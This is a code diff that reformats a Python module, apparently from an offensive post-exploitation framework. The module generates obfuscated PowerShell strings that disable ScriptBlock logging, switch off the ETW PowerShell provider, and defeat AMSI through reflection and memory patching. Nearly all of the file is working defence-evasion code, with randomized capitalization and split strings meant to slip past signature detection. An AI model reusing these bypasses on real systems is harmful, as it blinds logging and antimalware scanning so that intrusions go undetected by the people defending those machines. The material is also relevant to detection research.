@@ -1,34 +1,59 @@
 from __future__ import absolute_import
+
 from . import helpers
 
 
 def scriptBlockLogBypass():
     # ScriptBlock Logging bypass
-    bypass = helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
+    bypass = helpers.randomize_capitalization(
+        "$"
+        + helpers.generate_random_script_var_name("GPF")
+        + "=[ref].Assembly.GetType("
+    )
     bypass += "'System.Management.Automation.Utils'"
-    bypass += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+    bypass += helpers.randomize_capitalization(')."GetFie`ld"(')
     bypass += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-    bypass += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
+    bypass += helpers.randomize_capitalization(
+        ");If($"
+        + helpers.generate_random_script_var_name("GPF")
+        + "){$"
+        + helpers.generate_random_script_var_name("GPC")
+        + "=$"
+        + helpers.generate_random_script_var_name("GPF")
+        + ".GetValue($null);If($"
+        + helpers.generate_random_script_var_name("GPC")
+        + ""
+    )
     bypass += "['ScriptB'+'lockLogging']"
-    bypass += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
+    bypass += helpers.randomize_capitalization(
+        "){$" + helpers.generate_random_script_var_name("GPC") + ""
+    )
     bypass += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
+    bypass += helpers.randomize_capitalization(
+        "$" + helpers.generate_random_script_var_name("GPC") + ""
+    )
     bypass += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-    bypass += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+    bypass += helpers.randomize_capitalization(
+        "$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add"
+    )
     bypass += "('EnableScriptB'+'lockLogging',0);"
     bypass += helpers.randomize_capitalization("$val.Add")
     bypass += "('EnableScriptBlockInvocationLogging',0);"
-    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
+    bypass += helpers.randomize_capitalization(
+        "$" + helpers.generate_random_script_var_name("GPC") + ""
+    )
     bypass += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
     bypass += helpers.randomize_capitalization("=$val}")
-    bypass += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+    bypass += helpers.randomize_capitalization('Else{[ScriptBlock]."GetFie`ld"(')
     bypass += "'signatures','N'+'onPublic,Static'"
-    bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+    bypass += helpers.randomize_capitalization(
+        ").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}"
+    )
     return bypass
 
 
 def ETWBypass():
-    #tandasat killetw.ps1
+    # tandasat killetw.ps1
     bypass = "[System.Diagnostics.Eventing.EventProvider].\"GetFie`ld\"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider').\"GetFie`ld\"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);"
     return bypass
 
@@ -37,14 +62,14 @@ def mattifestation_amsibypass():
     # @mattifestation's AMSI bypass
     bypass = helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
     bypass += "'System.Management.Automation.Amsi'+'Utils'"
-    bypass += helpers.randomize_capitalization(');$Ref.GetField(')
+    bypass += helpers.randomize_capitalization(");$Ref.GetField(")
     bypass += "'amsiInitF'+'ailed','NonPublic,Static'"
     bypass += helpers.randomize_capitalization(").SetValue($null,$true);")
-    return bypass.replace('\n','').replace('    ', '')
+    return bypass.replace("\n", "").replace("    ", "")
 
 
 def liberman_amsibypass():
-    # Modified implementation of Tal Liberman's AMSI bypass 
+    # Modified implementation of Tal Liberman's AMSI bypass
     bypass = """
     $MethodDefinition = @"
     
@@ -72,11 +97,11 @@ def liberman_amsibypass():
     [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); 
     """
     bypass = bypass.replace('"kernel32"', '`"kernel32`"')
-    bypass = bypass.replace('@"','"')
-    bypass = bypass.replace('"@','"')
-    bypass = bypass.replace('\n','')
-    bypass = bypass.replace('    ', '')
-    
+    bypass = bypass.replace('@"', '"')
+    bypass = bypass.replace('"@', '"')
+    bypass = bypass.replace("\n", "")
+    bypass = bypass.replace("    ", "")
+
     return bypass
 
 
@@ -132,9 +157,8 @@ def rastamouse_amsibypass():
     bypass = bypass.replace('"Amsi"', '`"Amsi`"')
     bypass = bypass.replace('"Scan"', '`"Scan`"')
     bypass = bypass.replace('"Buffer"', '`"Buffer`"')
-    bypass = bypass.replace('@"','"')
-    bypass = bypass.replace('"@','"')
-    bypass = bypass.replace('\n','')
-    bypass = bypass.replace('    ', '')
+    bypass = bypass.replace('@"', '"')
+    bypass = bypass.replace('"@', '"')
+    bypass = bypass.replace("\n", "")
+    bypass = bypass.replace("    ", "")
     return bypass
-
